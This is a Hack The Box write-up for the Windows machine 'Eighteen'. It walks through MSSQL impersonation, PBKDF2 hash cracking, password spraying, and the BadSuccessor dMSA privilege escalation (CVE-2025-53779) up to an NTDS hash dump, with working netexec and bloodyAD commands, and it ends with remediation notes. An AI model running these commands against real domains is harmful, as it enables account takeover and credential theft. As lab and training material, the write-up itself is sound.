---
tags:
  - HTB
  - TJNull
  - OSCP
  - Windows
  - MSSQL
  - dMSA
  - badSuccessor
  - CVE-2025-53779
  - PBKDF2

icon: simple/gnometerminal
---

# Eighteen

!!! info "Box details"  
    https://app.hackthebox.com/machines/Eighteen  
    **Difficulty:** Easy (but honestly, Medium)  
    **OS:** Windows

> ippsec video: [youtube](https://www.youtube.com/watch?v=C9IYXphO7CI)  
> 0xdf blog: [0xdf.gitlab.io](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)

## Enumeration

This is an assumed breach box, so we start with credentials: kevin:iNa2we6haRj2gaw!


Our nmap shows us that only two ports are open:

``` text
80/tcp   open  http
1433/tcp open  ms-sql-s
```

Note: later this proved to be incorrect. Some how nmap "missed" 5985, even though it ran through all ports (-p-)

We can use impacket's mssql-client.py to connect to 1433 and see what we can do. But it turns out not much. We can't access the contents of the financial_planner database, much less do things like getting a command shell.

Using this cheatsheet (https://thewhiteh4t.github.io/blog/mssql-pentesting-cheatsheet/) we can test everything that this user is allowed to do. Eventually we find something interesting:

```
> SELECT    sp_you.name        AS you_are,    sp_target.name     AS login_you_can_impersonate FROM sys.server_permissions perm JOIN sys.server_principals sp_you    ON perm.grantee_principal_id = sp_you.principal_id JOIN sys.server_principals sp_target ON perm.major_id             = sp_target.principal_id WHERE perm.permission_name = 'IMPERSONATE';

# Output:

you_are   login_you_can_impersonate   
-------   -------------------------   
kevin     appdev                      

# To impersonate:
EXECUTE AS LOGIN = 'appdev';
```

Now as the appdev user we have access to the financial_planner database. There is a hash there, but since at first I couldn't crack it (more on that later), I tried something else instead. I created a new user and used my database access to turn myself into admin:

```
UPDATE users SET is_admin = 1;
```

However this doesn't give us anything. There's no functionality on the admin dashboard that gives us a foothold.


## Foothold

The path is to actually figure out how to crack the hash. Here is what the original hash looks like in the database:

pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133

Looking at this, I had assumed we were looking at at the following type of hash:

|Hash mode|Hash name|Example hash|
| ------- | ------- | ---------- |
|10900|PBKDF2-HMAC-SHA256|sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt

So I manually edited the hash to fit the format above and gave it to hashcat. This ran for a few hours through all of rockyou.txt and returned nothing. The issue is that I was looking at the wrong hash type. This is the correct hash:

|Hash mode|Hash name|Example hash|
| ------- | ------- | ---------- |
|10000|Django (PBKDF2-SHA256)|pbkdf2_sha256$20000$H0dPx8NeajVu$GiC4k5kqbbR9qWBlsRgDywNqC2vd9kqfk7zdorEnNas=|

Besides changing prefix and delimiters, we also need to base64 encode the data. But the hash we have is hex encoded. So first we need to hex decode and then pipe into base64.

``` text
echo -n 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 | xxd -r -p | base64
```

-r is for reverse (so it's deconding instead of encoding), -p is for plain (so it concatenates evertyhing.

We can combine the output with the correct prefix and delimiters to get:

pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=

Which hashcat cracks to `iloveyou1`. Ok, so finally we have a password, but whose is it? Let's rid brute to see who could that pw belong to.

``` text
$ netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute

```

With the list of users, we can spray. Spraying on mssql doen't work. As mentioned above, nmap missed port 5985, but if we spray the password we find that adam.scott can winrm with iloveyou1. We get the user flag. I also got the database credentials to spray that password with other users, but no success.

## Root

Privilege escalation for this box was incredibly difficult. Not only I had a hard time figuring out what the path was, but even after reading 0xdf and watching ippsec I still couldn't do it. I was trying to use my versions of bloodyAD and nxc to execute the exploit, but it didn't work. I had to copy ippsec / 0xdf to the letter by getting a specific branch of nxc that has the exploit for this.

First things first: the target is running windows server 2025. There is a specific password management / migration thing called dMSA (delegated Managed Service Accounts), which leads to a vulnerability called Bad Successor. I'm not 100% clear on how it works, but the key thing is we control the dMSA for an object we create, and a lowpriv user can generally create an object. So essentially we create an object and mess with its dMSA to be able to impersonate another user. Relevant blog posts:  
- https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory  
- https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch

In order to exploit this, we need to be able to access the ldap port of the target. Since this box isn't exposing its ports, I set up a tunnel using ligolo-ng and then added a route to 240.0.0.1 via ligolo's interface so that I can essentially access the 127.0.0.1 of the target in my own box (check tunneling cheatsheet if needed).

First, I tried using bloodyAD, since it has a bad successor module:
bloodyAD -H 10.129.5.107 -d eighteen.htb -u adam.scott -p iloveyou1 add badSuccessor -t "CN=ADMINISTRATOR,CN=USERS,DC=EIGHTEEN,DC=HTB" DC01

The output confirms that our user has the write permissions it needs on the Staff OU to execute the exploit. But I couldn't get it to work (despite the fact that we are able to create an object, I can't seem to create the ticket to then impersonate it).

So then I switched to nxc. The up-to-date version of nxc is able to enumrate this vulnerability with the module, but not exploit it:
``` text
nxc ldap dc01.eighteen.htb -u adam.scott -p iloveyou1 -M badsuccessor

# Output:
LDAP        224.0.0.1    389    DC01       [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        224.0.0.1    389    DC01       [+] eighteen.htb\adam.scott:iloveyou1 
BADSUCCE... 224.0.0.1    389    DC01       [+] Found domain controller with operating system Windows Server 2025: 224.0.0.2 (DC01.eighteen.htb)
BADSUCCE... 224.0.0.1    389    DC01       [+] Found 1 results
BADSUCCE... 224.0.0.1    389    DC01       IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb

```

But to actually exploit it, we need to get a specific branch of nxc that gives options to the badsuccessor module. Then we're able to exploit! Had to follow 0xdf step by step here:

```
$ git clone https://github.com/azoxlpf/NetExec.git

$ uv tool install . # later did uv tool uninstall netexec

$ netexec ldap dc01.eighteen.htb -u adam.scott -p 'iloveyou1' -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=0xdf TARGET_ACCOUNT=Administrator

# Above we created dMSA 0xdf, so nxc saved a ticket for us. Let's test our authentication with this ticket
$ KRB5CCNAME=0xdf\$.ccache netexec smb dc01.eighteen.htb --use-kcache

# So finally we can use this to dump hashes and get the Administrator hash, which gets us access to the root flag
$ KRB5CCNAME=0xdf\$.ccache netexec smb dc01.eighteen.htb --use-kcache --ntds

```

## Remediation notes
Apply CVE-2025-53779 (KB5063878) to all Windows Server 2025 domain controllers; audit and tighten OU-level delegation so that dMSA creation and migration-link attributes can only be modified by Tier 0 administrators; enable object auditing on dMSA objects and OUs to detect abuse.
